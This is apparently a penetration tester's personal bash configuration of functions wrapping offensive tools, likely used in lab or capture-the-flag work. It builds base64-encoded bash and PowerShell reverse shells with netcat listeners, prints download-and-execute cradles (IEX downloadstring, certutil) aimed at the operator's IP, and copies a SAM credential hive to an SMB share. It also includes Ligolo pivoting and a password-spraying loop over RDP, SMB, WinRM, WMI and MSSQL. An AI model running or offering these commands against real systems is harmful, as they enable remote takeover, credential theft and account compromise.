# My own alias:

# Start provisional web server to have access to my tools:
webserver() {
    # Set default values
    local default_directory="/home/david/Offensive-Security-Tools/"
    local port
    local directory
    local ip_address

    # Parse arguments
    if [ -z "$1" ]; then
        echo "Please provide at least a port number or use 'help' for usage instructions."
        return
    elif [ "$1" == "help" ]; then
        echo "Usage:"
        echo "  webserver <port> [directory]"
        echo "    <port>: The port number to start the HTTP server on."
        echo "    [directory]: The directory to serve (optional). Default is $default_directory."
        echo ""
        echo "After the server starts, you can use the following commands:"
        echo "  download <directory> <file>  - Print download commands for the specified directory and file."
        echo "  download <file>              - Print download commands for the specified file in the default directory."
        echo ""
        return
    fi

    # Assign port and directory based on arguments
    port="$1"
    directory="${2:-$default_directory}"

    # Get local IP address
    ip_address=$(ip -f inet addr show tun0 | sed -En -e 's/.*inet ([0-9.]+).*/\1/p')

    # Start the Python HTTP server
    echo "Starting HTTP server on port $port, serving directory $directory"
    python3 -m http.server -d "$directory" "$port" &

    # Keep the prompt open for additional commands
    while true; do
        # Show prompt and read input
        echo -n "> "
        read command arg1 arg2

        # Check for "download" command with arguments
        if [[ "$command" == "download" ]]; then
            if [ -n "$arg1" ] && [ -n "$arg2" ]; then
                # download <directory> <file>
                echo "iwr -Uri http://$ip_address:$port/$arg1/$arg2 -Outfile $arg2"
                echo "IEX(New-Object Net.Webclient).downloadstring('http://$ip_address:$port/$arg1/$arg2')"
                echo "certutil -urlcache -f http://$ip_address:$port/$arg1/$arg2 $arg2"
                echo "wget http://$ip_address:$port/$arg1/$arg2"
            elif [ -n "$arg1" ]; then
                # download <file>
                echo "iwr -uri http://$ip_address:$port/$arg1 -Outfile $arg1"
                echo "IEX(New-Object Net.Webclient).downloadstring('http://$ip_address:$port/$arg1')"
                echo "certutil -urlcache -f http://$ip_address:$port/$arg1 $arg1"
                echo "wget http://$ip_address:$port/$arg1"
            else
                echo "Usage: download <directory> <file> or download <file>"
            fi
        elif [[ "$command" == "help" ]]; then
            echo "Available commands:"
            echo "  download <directory> <file>  - Print download commands for the specified directory and file."
            echo "  download <file>              - Print download commands for the specified file in the default directory."
            echo "  help                         - Show this help message."
            echo "  exit                         - Stop the server and exit."
        elif [[ "$command" == "exit" ]]; then
            echo "Stopping the HTTP server."
            pkill -f "python3 -m http.server -d $directory $port"
            break
        else
            echo "Unknown command. Type 'help' for usage."
        fi
    done
}

# Alias for dirsearch:
alias dirsearch='python3 /home/david/Offensive-Security-Tools/Enumeration/dirsearch/dirsearch.py'

# Generate power shell reverse shell encoded in BASE64:
basepower() {
        IP=$(ip -f inet addr show tun0 | sed -En -e 's/.*inet ([0-9.]+).*/\1/p')
        python3 /home/david/Offensive-Security-Tools/ReverseShells/PowerShellGenerators/autoPowerShellGen.py $IP "$1" | xclip -selection clipboard
        xclip -out -selection clipboard
        sudo nc -nlvp $1
}

# Generate bash reverse shell encoded in base64:
basebash() {
        IP=$(ip -f inet addr show tun0 | sed -En -e 's/.*inet ([0-9.]+).*/\1/p')
        rev="/bin/bash -i >& /dev/tcp/$IP/$1 0>&1"
        brev=$(echo -n "$rev" | base64)
        echo "echo $brev | base64 -d | bash" | xclip -selection clipboard
        xclip -out -selection clipboard
        sudo nc -nlvp $1
}

# Set up ligolo server for pivoting:
ligon() {
        sudo ip tuntap add user david mode tun ligolo
        sudo ip link set ligolo up
        /home/david/Offensive-Security-Tools/Pivoting/ligolo-proxy -selfcert
}

smbserver() {
        IP=$(ip -f inet addr show tun0 | sed -En -e 's/.*inet ([0-9.]+).*/\1/p')
        echo "########################################################"
        echo "Commands to use the shared folder:"
        echo -E "- net use \\\\$IP\share david /user:david"
        echo -E "- net use Z: \\\\$IP\share david /user:david"
        echo -E "- copy sam.save \\\\$IP\share\ "
        echo -E "- robocopy \\\\$IP\share\\netcat .\ nc.exe"
        echo "########################################################"
impacket-smbserver share $1 -smb2support -user david -password david
}

gitdump() {
        if [ $# -lt 2 ]
        then
                echo "No arguments supplied"
                echo "gitdump remoteurl localDirectory"
                echo "Example: gitdump http://10.10.16.8/ ../savegitdirectory"
        else
                python3 /home/david/Offensive-Security-Tools/Miscellaneous/git-dumper/git_dumper.py $1 $2
        fi
}

genuser() {
        if [ $# -eq 2 ]
        then
                python3 /home/david/Offensive-Security-Tools/AD/username_generator/username_generator.py $1 $2
        elif [ $# -eq 3 ]
        then
                python3 /home/david/Offensive-Security-Tools/AD/username_generator/username_generator.py $1 $2 $3
        else
                echo "No arguments supplied"
                echo "genuser -w /directory/users/file.txt"
                echo "genuser -w /directory/users/file.txt -u # Produce uppercase permutations."
        fi
}

enumshare() {
    local script_path="/home/david/Offensive-Security-Tools/CustomScripts/smbEnumerationShares.py"  # Replace with the full path to your script

    if [[ "$1" == "--help" || "$1" == "-h" ]]; then
        python3 "$script_path" -h
        return
    fi

    python3 "$script_path" "$@"
}

# netexec_spray: Perform password spraying across all protocols supported by netexec
netexec_spray() {
    # Ensure netexec (nxc) is installed
    if ! command -v nxc &> /dev/null; then
        echo "Error: nxc is not installed or not in PATH."
        return 1
    fi

    # Parse arguments
    local targets=""
    local users=""
    local passwords=""
    local domain=""
    local verbose=false
    local output_file=""

    while [[ "$#" -gt 0 ]]; do
        case "$1" in
            -i)
                shift
                targets="$1"
                ;;
            -u)
                shift
                users="$1"
                ;;
            -p)
                shift
                passwords="$1"
                ;;
            -d)
                shift
                domain="$1"
                ;;
            -v|--verbose)
                verbose=true
                ;;
            -o)
                shift
                output_file="$1"
                ;;
            -h|--help)
                echo "Usage: netexec_spray -i <targets|targets.txt> -u <user|users.txt> -p <password|passwords.txt> [-d <domain>] [-v|--verbose] [-o <output_file>]"
                echo ""
                echo "Options:"
                echo "  -i  List of targets (space-separated IPs or file with targets)."
                echo "  -u  User (single user or file with list of users)."
                echo "  -p  Password (single password or file with list of passwords)."
                echo "  -d  Domain (optional)."
                echo "  -v, --verbose  Enable verbose output."
                echo "  -o  Output file to save results (optional)."
                echo ""
                echo "This function sprays passwords across all supported protocols: ssh, rdp, ftp, smb, winrm, vnc, wmi, mssql, ldap."
                echo ""
                echo "Special behaviors:"
                echo "  - Protocol 'winrm' is executed twice: once normally and once with --local-auth."
                echo "  - Protocol 'mssql' is executed twice: once normally and once with -windows-auth."
                echo "  - Ctrl+C skips to the next protocol."
                return
                ;;
            *)
                echo "Unknown option: $1"
                return 1
                ;;
        esac
        shift
    done

    # Ensure required arguments are provided
    if [[ -z "$targets" || -z "$users" || -z "$passwords" ]]; then
        echo "Error: -i (targets), -u (user), and -p (password) are required."
        return 1
    fi

    # List of supported protocols
    local protocols=("rdp" "smb" "winrm" "wmi" "mssql")

    # Handle Ctrl+C to skip to the next protocol
    trap 'echo "Skipping to next protocol..."; continue' SIGINT

    # Iterate over each protocol and execute the command
    for protocol in "${protocols[@]}"; do
        echo "Running password spray for protocol: $protocol"

        # Build the base command
        local command="nxc $protocol"

        if [[ -f "$targets" ]]; then
            command+=" $targets"
        else
            command+=" $targets"
        fi

        if [[ -f "$users" ]]; then
            command+=" -u $users"
        else
            command+=" -u $users"
        fi

        if [[ -f "$passwords" ]]; then
            command+=" -p $passwords"
        else
            command+=" -p $passwords"
        fi

        if [[ -n "$domain" ]]; then
            command+=" -d $domain"
        fi

        if [[ "$verbose" == true ]]; then
            command+=" --verbose"
        fi

        command+=" --continue-on-success"

        # Execute the command and optionally save output
        if [[ -n "$output_file" ]]; then
            echo "Executing: $command"
            eval "$command" | tee -a "$output_file"
        else
            echo "Executing: $command"
            eval "$command"
        fi

        # Special behavior for winrm and mssql protocols
        if [[ "$protocol" == "winrm" ]]; then
            echo "Running winrm with --local-auth (removing domain)"
            local winrm_command="nxc $protocol"
            winrm_command+=" $targets"
            winrm_command+=" -u $users"
            winrm_command+=" -p $passwords"
            winrm_command+=" --continue-on-success --local-auth"
            if [[ "$verbose" == true ]]; then
                winrm_command+=" --verbose"
            fi

            if [[ -n "$output_file" ]]; then
                echo "Executing: $winrm_command"
                eval "$winrm_command" | tee -a "$output_file"
            else
                echo "Executing: $winrm_command"
                eval "$winrm_command"
            fi
        elif [[ "$protocol" == "mssql" ]]; then
            echo "Running mssql with -windows-auth (removing domain)"
            local mssql_command="nxc $protocol"
            mssql_command+=" $targets"
            mssql_command+=" -u $users"
            mssql_command+=" -p $passwords"
            mssql_command+=" --continue-on-success --local-auth"
            if [[ "$verbose" == true ]]; then
                mssql_command+=" --verbose"
            fi

            if [[ -n "$output_file" ]]; then
                echo "Executing: $mssql_command"
                eval "$mssql_command" | tee -a "$output_file"
            else
                echo "Executing: $mssql_command"
                eval "$mssql_command"
            fi
        fi

    done

    echo "Password spray completed for all protocols."
}
